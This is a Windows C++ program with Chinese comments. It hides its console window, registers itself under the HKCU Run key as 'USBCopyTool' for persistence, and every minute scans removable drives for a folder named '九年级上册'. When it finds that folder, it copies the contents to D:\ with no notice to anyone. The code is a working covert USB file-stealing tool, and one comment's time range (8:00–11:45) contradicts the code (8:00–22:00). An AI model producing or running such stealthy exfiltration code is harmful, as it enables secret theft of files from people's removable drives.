#include <windows.h>
#include <shlwapi.h>
#include <string>
#include <queue>
#include <ctime>

#pragma comment(lib, "shlwapi.lib")

using namespace std;

const wstring TARGET_FOLDER = L"九年级上册";
const wstring DEST_PATH = L"D:\\九年级上册";

// 检查是否是目录
bool IsDirectory(const wstring& path) {
    DWORD attr = GetFileAttributesW(path.c_str());
    return (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY));
}

// 递归查找目标文件夹
wstring FindTargetFolder(const wstring& rootPath) {
    queue<wstring> directories;
    directories.push(rootPath);

    while (!directories.empty()) {
        wstring currentDir = directories.front();
        directories.pop();

        wstring potentialTarget = currentDir + L"\\" + TARGET_FOLDER;
        if (IsDirectory(potentialTarget)) {
            return potentialTarget;
        }

        WIN32_FIND_DATAW findData;
        wstring searchPath = currentDir + L"\\*";
        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (wcscmp(findData.cFileName, L".") != 0 &&
                    wcscmp(findData.cFileName, L"..") != 0 &&
                    (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    directories.push(currentDir + L"\\" + findData.cFileName);
                }
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
    }
    return L"";
}

// 复制目录
void CopyDirectorySilent(const wstring& src, const wstring& dst) {
    CreateDirectoryW(dst.c_str(), NULL);

    WIN32_FIND_DATAW findData;
    wstring searchPath = src + L"\\*";
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) {
                continue;
            }

            wstring srcPath = src + L"\\" + findData.cFileName;
            wstring dstPath = dst + L"\\" + findData.cFileName;

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                CopyDirectorySilent(srcPath, dstPath);
            }
            else {
                CopyFileW(srcPath.c_str(), dstPath.c_str(), TRUE);
            }
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
}

// 检查USB
void CheckUSB() {
    for (wchar_t c = L'A'; c <= L'Z'; c++) {
        wstring drive = wstring(1, c) + L":\\";
        if (GetDriveTypeW(drive.c_str()) == DRIVE_REMOVABLE) {
            // 检查驱动器是否就绪
            DWORD sectors, bytes, freeClusters, totalClusters;
            if (GetDiskFreeSpaceW(drive.c_str(), &sectors, &bytes, &freeClusters, &totalClusters)) {
                wstring foundPath = FindTargetFolder(drive);
                if (!foundPath.empty()) {
                    CopyDirectorySilent(foundPath, DEST_PATH);
                    break;
                }
            }
        }
    }
}

// 设置开机自启动
void SetAutoStart() {
    HKEY hKey;
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);

    // 添加到注册表启动项
    RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExW(hKey, L"USBCopyTool", 0, REG_SZ, (BYTE*)szPath, (wcslen(szPath) + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);
}

// 检查当前时间是否在8:00到11:45之间
bool IsWithinTimeRange() {
    SYSTEMTIME st;
    GetLocalTime(&st);

    // 检查小时和分钟
    if (st.wHour < 8) return false;
    if (st.wHour > 22) return false;
    if (st.wHour == 22 && st.wMinute > 00) return false;

    return true;
}

// 主函数
int main() {
    // 隐藏控制台窗口
    HWND console = GetConsoleWindow();
    ShowWindow(console, SW_HIDE);

    // 设置窗口样式为工具窗口，使其不在任务栏显示
    SetWindowLongPtr(console, GWL_EXSTYLE, GetWindowLongPtr(console, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);

    // 设置开机自启动
    SetAutoStart();

    // 主循环
    while (true) {
        // 只在8:00到11:45之间检查
        if (IsWithinTimeRange()) {
            CheckUSB();
        }

        // 每60秒检查一次
        Sleep(60000);
    }

    return 0;
}